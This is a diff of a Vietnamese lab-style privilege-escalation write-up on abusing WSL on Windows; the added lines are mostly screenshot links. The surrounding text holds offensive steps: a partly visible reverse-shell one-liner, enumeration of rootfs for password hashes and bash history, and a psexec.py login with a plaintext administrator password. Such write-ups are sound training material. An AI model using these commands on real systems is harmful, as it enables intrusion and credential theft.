@@ -9,19 +9,25 @@ Khi kích hoạt WSL, người dùng có thể chọn và cài đặt một bả
 # Liệt kê WSL trên máy Windows mục tiêu
 
 Sau khi tìm ra cách khai thác web và vượt qua AV, tôi đã thu được một lớp vỏ đảo ngược với tư cách là người dùng Tyler.
+![image-87](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/816a4730-c080-4a10-8851-7aa840a4d6ba)
 
 ## Phương pháp đếm thủ công
 
 Khi nói đến việc liệt kê WSL trên hệ thống đích, tôi muốn bắt đầu bằng cách tìm thư mục Distros mặc định có tại C:\Distros .
 
+![image-88](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/6fec4531-133e-4606-9de6-ab1d785c0829)
+
 Trong C:\ tôi thực sự thấy hai gợi ý rằng WSL đã được cài đặt trên hệ thống này. Đầu tiên, chúng ta có thể thấy thư mục Distros mặc định, nhưng chúng ta cũng có thể thấy tệp ZIP cho ubuntu.
 Bên trong thư mục Distros, tôi đang tìm kiếm tệp EXE cho một bản phân phối đã cài đặt, ví dụ: ubuntu.exe .
+
+![image-89](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/18c6ce4d-95d5-4a97-ade4-cb66e8cc0854)
 
 Nếu thư mục Distros mặc định không có trên hệ thống, chẳng hạn như nếu thư mục tùy chỉnh được sử dụng thay thế, thì chúng ta vẫn có thể liệt kê xem WSL có trên hệ thống hay không bằng cách kiểm tra hai tệp nhị phân: bash.exe và wsl.exe .
 
 ```
 cmd.exe /c "cd C:\windows\system32 & dir /S /B bash.exe == wsl.exe"
 ```
+![image-90](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d0bd16d5-1215-4742-9274-0661b67c3a4f)
 
 Ở đây chúng ta thấy cả hai tập tin đều được tìm thấy trên hệ thống. Theo mặc định, wsl.exe sẽ có trên hầu hết các hệ điều hành Windows hiện đại, nhưng bash.exe thường chỉ được tìm thấy khi cài đặt WSL.
 Để tìm xem wsl có “trực tuyến” hay không và thu thập danh sách các bản phân phối đang chạy, hãy sử dụng lệnh sau cho windows 10 1903 trở lên:
@@ -35,6 +41,7 @@ Ngoài ra, đối với các phiên bản Windows cũ hơn 1903, chúng ta có t
 ```
 wslconfig /list
 ```
+![image-91](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/2e5fadb1-77c7-4a08-8c85-40ddd13bfbdd)
 
 Kết quả đầu ra cho thấy có một bản phân phối đã đăng ký được cài đặt: Ubuntu – 18.04
 Ngoài ra, tôi có thể tìm thấy thông tin này bằng winPEAS .
@@ -47,6 +54,7 @@ winPEAS là công cụ liệt kê tối ưu và cung cấp lượng thông tin L
 Nói chung khi chạy winPEAS, chúng ta sẽ chạy nó không có tham số để chạy 'tất cả các kiểm tra' và sau đó xem xét tất cả các dòng đầu ra theo từng dòng, từ trên xuống dưới.
 
 Tuy nhiên, trong trường hợp này, chúng ta không cần lo lắng về phần và phần phụ để tìm thông tin WSL vì nó sẽ nằm trong lần kiểm tra cuối cùng thứ hai: Interesting file and registry và luôn ở dưới cùng nếu nó tồn tại.
+![image-95-1024x244](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0a8c5835-bdc6-4075-a8a8-fae78365f739)
 
 Ở đây, chúng ta có thể thấy rằng PEAS đã tìm thấy WSL bằng cách kiểm tra bash.exe và wsl.exe (giống như chúng ta đã làm thủ công) và sau đó nó cũng tìm thấy thư mục gốc cho phiên bản WSL (điều này thực sự thú vị và chúng ta sẽ biết lý do tại sao sau). Cuối cùng, nó cung cấp lệnh để tôi chạy để thu thập thêm thông tin về bản phân phối.
 
@@ -63,6 +71,7 @@ wsl.exe "whoami"
 
 bash.exe -c "whoami"
 ```
+![image-94](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/867a9624-5a9d-4462-862d-26022c1e7c58)
 
 Ở đây chúng ta có thể thấy rằng cả hai lệnh đều thực hiện cùng một công việc và chúng ta đã root bên trong bản phân phối Linux!
 Nếu tôi nhận thấy rằng tôi không chạy bằng root, tôi có hai lựa chọn.
@@ -102,6 +111,7 @@ if([System.IO.File]::Exists("C:\Windows\System32\bash.exe")){bash.exe -c "rm /tm
 ```
 
 Việc sử dụng bất kỳ phương pháp nào ở trên sẽ dẫn đến một trình bao đảo ngược bên trong phiên bản WSL.
+![image-97](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/137cac8e-7cdf-4b16-b266-2159c16b8223)
 
 NOTE: Điều này không giống như việc root mục tiêu thực tế. tôi thực sự quan tâm nhất đến việc tìm kiếm mật khẩu khi tôi đã có được shell trong phiên bản WSL. Điều này là do tôi đã root và tôi sẽ không thể làm gì nhiều trong phiên bản này ngoài việc liệt kê những phát hiện thú vị.
 
@@ -115,12 +125,16 @@ Sử dụng lệnh sau, chúng ta có thể bắt đầu tìm thư mục gốc c
 ```
 ls C:\Users\tyler\AppData\Local\Packages | findstr /v "Microsoft\. Windows\."
 ```
+![image-98](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/6d371baf-a5ae-4355-b549-365a0adf3c8b)
 
 Ở đây chúng ta có thể thấy một thư mục 'Ubuntu', vì vậy chúng ta có thể tiến hành kiểm tra xem có gì trong đó. tôi đang tìm kiếm một thư mục có tên LocalState - và tôi có thể thấy nó ở đây!
+![image-99](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/0764743f-b634-4350-adbc-c7af3ac26abd)
 
 Và sau đó kiểm tra thư mục đó tiếp theo chúng ta tìm thấy rootfs , là thư mục gốc của hệ thống tập tin!
+![image-100-1024x191](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/df04f9b3-2daf-4fbc-8474-6c940a129342)
 
 Cuối cùng, vào thư mục rootfs , chúng ta có thể thấy rõ đây là hệ thống tập tin Linux.
+![image-101-1024x457](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/281434b1-a3e8-473f-83b5-77c0870249bc)
 
 # Liệt kê một phiên bản WSL cho các kết quả JUICY
 
@@ -129,8 +143,10 @@ Bây giờ tôi đã có toàn quyền truy cập vào hệ thống tệp Linux 
 Về cơ bản, điều tôi muốn làm là tìm kiếm mật khẩu – ít nhiều. Vì tôi đã root trong hệ thống Linux nên tôi có toàn quyền truy cập vào mọi tệp, bao gồm cả những vị trí phổ biến để tìm mật khẩu / hàm băm chẳng hạn như tệp shadow ; trong các tệp khác (webroot, tệp người dùng, v.v.); lịch sử bash; và nhiều hơn nữa!
 
 Sau một số liệt kê thủ công (hoặc sử dụng linpeas.sh trong quá trình quét winpeas), chúng ta sẽ có thể tìm thấy một số tệp đáng để khám phá thêm. Ví dụ: giả sử tôi tìm thấy tệp .bash_history trong thư mục /root có một số byte trong đó, điều đó có nghĩa là nó chưa bị xóa.
+![image-102](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/809ef278-905c-4f24-9f28-d64cd9140860)
 
 Ta đã nhận được thông tin đăng nhập của quản trị viên cục bộ cho máy chủ Windows!
+![image-103](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/018c400b-bafd-4455-bc1d-c9ed3df25315)
 
 # Sử dụng những phát hiện để có được Shell HỆ THỐNG
 
@@ -139,3 +155,4 @@ Bây giờ chúng ta đã tìm thấy thông tin xác thực của quản trị 
 ```
 psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
 ```
+![image-104](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/d696fa61-1e00-4653-99b6-b3beee59a4b9)
